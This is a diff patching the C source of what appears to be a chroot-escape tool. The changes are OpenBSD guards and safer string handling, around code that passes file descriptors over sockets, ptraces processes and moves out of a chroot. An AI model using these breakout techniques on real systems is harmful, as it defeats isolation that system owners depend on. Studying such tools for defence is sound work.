@@ -8,10 +8,9 @@
  * ----------------------------------------------------------------------------
  */
 
-#include <sys/ptrace.h>
 #include <sys/types.h>
+#include <sys/ptrace.h>
 #include <sys/wait.h>
-#include <sys/user.h>
 #include <sys/un.h>
 #include <sys/socket.h>
 #include <sys/select.h>
@@ -29,6 +28,10 @@
 #include <getopt.h>
 #include <fcntl.h>
 #include <netdb.h>
+#include <sys/user.h>
+#if __OpenBSD__
+#include <machine/reg.h>
+#endif
 
 //FreeBSD
 #ifndef PTRACE_ATTACH
@@ -96,7 +99,6 @@
 #define SHELLNUM	11
 #define FSNUM		6
 
-#define UNIX_PATH_MAX   108
 #if __linux__
 #define SOCKETNAME	"#anonsocket"
 #else
@@ -116,6 +118,7 @@ char *shells[] = {"/bin/bash", "/bin/sh", "/bin/dash", "/bin/ksh",
         "/bin/ksh", "/usr/bin/csh", "/usr/bin/dash",
         "/usr/bin/zsh" };
 
+#if !__OpenBSD__
 // based on the examples form http://www.thomasstover.com/uds.html
 int send_fd(int socket, int fd_to_send)
 {
@@ -177,18 +180,18 @@ int recv_fd(int socket)
     socket_message.msg_controllen = CMSG_SPACE(sizeof(int));
 
     if(recvmsg(socket, &socket_message, 0) < 0)
-    return -1;
+        return -2;
 
     if(message_buffer[0] != 'F')
     {
 	/* this did not originate from the above function */
-	return -1;
+	return -3;
     }
 
     if((socket_message.msg_flags & MSG_CTRUNC) == MSG_CTRUNC)
     {
 	/* we did not provide enough space for the ancillary element array */
-	return -1;
+	return -4;
     }
 
     /* iterate ancillary elements */
@@ -204,9 +207,9 @@ int recv_fd(int socket)
 	}
     }
 
-    return -1;
+    return -5;
 }
-
+#endif
 void putdata(pid_t child, long addr,
              char *str, int len)
 {   char *laddr;
@@ -246,7 +249,9 @@ void usage(char *tool)
 #if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__
 	"    -1\tClassic with saved file descriptor\n"
 #endif
+#if !__OpenBSD__
 	"    -2\tUnix domain socket\n"
+#endif
 #if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
 	!__APPLE__
 	"    -3\tMount /proc\n"
@@ -417,6 +422,7 @@ int classicfd(char *dir) {
 }
 #endif
 
+#if !__OpenBSD__
 int uds(char *dir) 
 {
     int err, i, fd, fd2, socket_fd, connection_fd;
@@ -471,10 +477,10 @@ int uds(char *dir)
         }
         memset(&addr, 0, sizeof(struct sockaddr_un));
         addr.sun_family = AF_UNIX;
-        snprintf(addr.sun_path, UNIX_PATH_MAX, "%s", SOCKETNAME);
+        snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", SOCKETNAME);
 	// seting abstract named socket here, to be accessible from chroot
 	// could be standard uds as well, just putting it under the new chroot
-#if !__FreeBSD__ && !__OpenBSD__
+#if !__FreeBSD__
 	addr.sun_path[0] = 0;
 #endif
 
@@ -487,9 +493,9 @@ int uds(char *dir)
 	}
 
 	printf("[+] P: receiving file descriptor thru unix domain socket\n");
-	if ((fd = recv_fd(socket_fd)) == -1)
+	if ((fd = recv_fd(socket_fd)) < 0)
 	{
-	    printf("[-] P: error receiving file descriptor\n");
+	    printf("[-] P: error receiving file descriptor: %d\n", fd);
                         return 0xDEADBEEF;
 	}
 	
@@ -551,8 +557,8 @@ int uds(char *dir)
 	}
 	memset(&addr, 0, sizeof(struct sockaddr_un));
 	addr.sun_family = AF_UNIX;
-	snprintf(addr.sun_path, UNIX_PATH_MAX, "%s/%s", dir, SOCKETNAME);
-#if !__FreeBSD__ && !__OpenBSD__
+	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/%s", dir, SOCKETNAME);
+#if !__FreeBSD__
 	addr.sun_path[0] = 0;
 #endif
 
@@ -594,8 +600,8 @@ int uds(char *dir)
     }
 
     return 0;
-
 }
+#endif
 
 #if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
         !__APPLE__
@@ -1000,17 +1006,18 @@ int ptracepid(unsigned long long pid, int x64, unsigned int port)
 
 int moveooc(char *chrootdir, char *nesteddir, char *newdir) 
 {
-    int err, i;
+    int err, i, size;
     struct stat dirstat;
     pid_t pid;
     char *childdir = NULL;
 
-    if ((childdir = malloc(strlen(chrootdir)+strlen(nesteddir)+2)) == NULL)
+    size = strlen(chrootdir)+strlen(nesteddir)+2;
+    if ((childdir = malloc(size)) == NULL)
     {
 	printf("[-] error allocating memory\n");
 	return 0xDEADBEEF;
     }
-    sprintf(childdir, "%s/%s", chrootdir, nesteddir);
+    snprintf(childdir, size, "%s/%s", chrootdir, nesteddir);
 
     if ((err = stat(chrootdir, &dirstat)) == 0) 
     {
@@ -1321,12 +1328,14 @@ int main(int argc, char **argv)
                 printf("[-] Missing argument: --dir\n\n");
             break;
 #endif
+#if !__OpenBSD__
         case 2:
             if (dir1_arg)
 		return uds(dir1_arg);
             else
                 printf("[-] Missing argument: --dir\n\n");
             break;
+#endif
 #if !__FreeBSD__ && !__OpenBSD__ && !__DragonflyBSD__ && \
         !__APPLE__
         case 3:
